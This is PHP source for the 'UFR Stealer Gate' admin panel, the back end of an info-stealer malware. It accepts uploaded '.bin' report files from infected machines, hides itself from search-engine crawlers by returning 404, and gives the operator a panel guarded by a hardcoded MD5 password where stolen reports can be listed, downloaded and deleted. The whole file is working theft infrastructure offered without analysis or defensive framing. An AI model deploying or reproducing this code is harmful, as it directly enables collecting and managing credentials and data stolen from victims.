<?php
  $pw = 'e10adc3949ba59abbe56e057f20f883e';
  $dirname = 'reports';
  
  if(!empty($_SERVER['HTTP_USER_AGENT']))
  {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT']))
    {
      header('HTTP/1.0 404 Not Found');
      exit;
    }
  }
  
  $ip = $_SERVER["REMOTE_ADDR"];
  $myfile = $_FILES['myfile']['tmp_name'];
  $name = basename($_FILES['myfile']['name']);
  @mkdir($dirname, 0777);
  $f = @fopen("$dirname/index.php",'w'); 
  @fclose($f);
  if ($name <> '')
  {
    $ext = pathinfo($name);
    if ($ext['extension'] != 'bin')
    { 
      exit;
    }
    @mkdir($dirname, 0777);
    @chdir($dirname);
    $f = @fopen('index.php','w'); 
    @fclose($f);
    move_uploaded_file($myfile, $name); 
    @chmod($name, 0644);
    exit;
  }
  
  $cookiez = @$_COOKIE['pwd'];
  $logout = $_GET['logout'];

  $style = '<style type="text/css">'.
           'body { background-color: #4F4F4F; font-family: monospace; text-align: center;}'.
           '#ufr_block { display: none; float: right; padding-top: 2px; margin-top: 8px;}'.
           '#ufr_header { background-color: #363636; color: #80ff80; margin: 0 auto; padding: 0 11px; width: 95%; text-align: left;}'.
           '#ufr_title { font-weight: bold; font-size: 16px; padding: 8px 0 11px; float: left; color: #80ff80;}'.
           '#ufr_body { text-align: left; background-color: #454545; display: none; padding: 11px; width: 95%; margin: 0 auto 20px auto; color: #80ff80;}'.
           '#ufr_ip { color: #80ff80; text-align: right;}'.
           '#ufr_ip_1 { color: #80ff80; font-weight: bold;}'.
           '#ufr_logout { text-align: right; }'.
           '#ufr_logout a { color: #80ff80; cursor: pointer; }'.
           '#ufr_login { width: 350px; background-color: #363636; }'.
           '#id_down a { color: #ffff80; text-decoration: none; }'.
           '#id_down a:hover{ text-decoration:underline; }'.
           '#id_header { color: #80ff80; text-decoration: none; background-color: #5E5E5E; }'.
           '#id_size { color: #FFFFFF;}'.
           '.reps td { font-family: "Verdana"; font-size: 8pt; padding: 3px; }'.
           '.reps tr:nth-of-type(odd) {background-color: #535353;}'.
           '.reps tr:nth-of-type(even) {background-color: #4b4b4b;}'.
           '.reps tr:hover{ background-color:#363636; }'.
           '.headline { border: 0px; text-align: left; width: 90%; }'.
           '.hidden { display: none; border: 1px solid #D3D3D3;text-align: center; margin-top: 1px;width: 90%;}</style>';

  if ($logout == "ok")
  {
    setcookie("pwd", " ");
    echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://google.com/'></head></html>";
    exit;
  }

  if($cookiez == $pw)
  {
    if (!empty($_GET['delete']))
    {
      @unlink($dirname.'/'.$_GET['delete']);
    }
    echo '<html><head><meta http-equiv="content-type" content="text/html; charset=windows-1251"><title>UFR Stealer Gate - Welcome!</title>';

    echo $style;

    echo '</head><body><form name="logoutform" action="index.php" method="post" ><input name="logout" type="hidden"></form>'.
          '<div id="ufr_header"><div style="display: block;" id="ufr_block"><div id="ufr_ip">Client IP: <span id="ufr_ip_1">'.$ip.'</span></div>'.
          '<div id="ufr_logout"><a href="'.$SCRIPT_NAME.'?logout=ok">Log Out</a></div></div><div id="ufr_title">UFR Stealer Gate'.
          '<p style="margin: 3px 0px 0px;">Admin Panel</p></div><div style="clear: both;"></div></div><div style="display: block;" id="ufr_body">';
    
    $dir=opendir($dirname);
    $i=0;
    while ($file = readdir($dir))
    {
      if($file!='.' && $file!='..' && $file!='index.php')
      {
        $arr_files[$i] = $file;
        $arr_sizes[$i] = @filesize($dirname.'/'.$file);
        $arr_datetime[$i] = date('Y-m-d H:i:s', @filemtime($dirname.'/'.$file));
        $i++;
      }
    }
    @array_multisort($arr_datetime,SORT_DESC,$arr_sizes,$arr_files);
    echo '<center><div class="headline"><table cellspacing="0" width="100%" class="reps"><tr>'.
          '<td id="id_header" width="65%">[ Files ('.$i.') ]</td>'.
          '<td id="id_header" width="10%">[ Size ]</td>'.
          '<td id="id_header" width="15%">[ Modify ]</td>'.
          '<td id="id_header" width="10%">[ Action ]</td></tr>';
    for($w=0;$w<$i;$w++)
    {
      if($arr_sizes[$w] >= 1024)
        $fsstr = sprintf('%1.2f',$arr_sizes[$w]/1024 ).' KB';
      else
        $fsstr = $arr_sizes[$w].' B';
      echo '<tr class="even"><td id="id_down" width="65%"><a href="'.$dirname.'/'.$arr_files[$w].'">'.$arr_files[$w].'</a></td>'.
                '<td id="id_size" width="10%">'.$fsstr.'</td>'.
                '<td id="id_size" width="15%">'.$arr_datetime[$w].'</td>'.
                '<td id="id_down" width="10%"><a href="'.$_SERVER['PHP_SELF'].'?delete='.$arr_files[$w].'">Delete</a></td></tr>';
    }
    echo '</table></div></center></body></html>';
    closedir($dir);
  }
  else
  {
    $b = md5($_POST['pwd']);
    if ($b == $pw)
    {
      setcookie("pwd", "$b", time()+10800); # 3 hours
      echo '<html><head><META HTTP-EQUIV="Refresh" content ="0;URL='.$SCRIPT_NAME.'"></head></html>';
    }
    else
    {
      echo '<html><head><meta http-equiv="content-type" content="text/html; charset=windows-1251"><title>UFR Stealer Gate - Welcome!</title>'.$style.
            '</head><body><div id="ufr_header"><div style="display: block;" id="ufr_block"><div id="ufr_ip">Client IP: <span id="ufr_ip_1">'.$ip.
            '</span></div></div><div id="ufr_title">UFR Stealer Gate<p style="margin: 3px 0px 0px; color: #80ff80;">Admin Panel</p></div>'.
            '<div style="clear: both;"></div></div><div style="display: block;" id="ufr_body"><br><br><br><center><div id="ufr_login">'.
            '<table><br><font color="#80ff80" size=+2><b>Secret Zone</b></font><br><br><form action="" method="post"><table style="border-style:none">'.
            '<tr><td style="width:20%; border-style:none"><font color="#FFFFFF">Pwd:</font></td><td>'.
            '<input style="width:100%; border-style:none" name="pwd" type="password"></td></tr><tr><td style="border-style:none" colspan="2">'.
            '<input style="width:300px" value="Log In" type="submit"></td></tr></table></form></table><br></div></center></div></body></html>';
    }
  }  
?>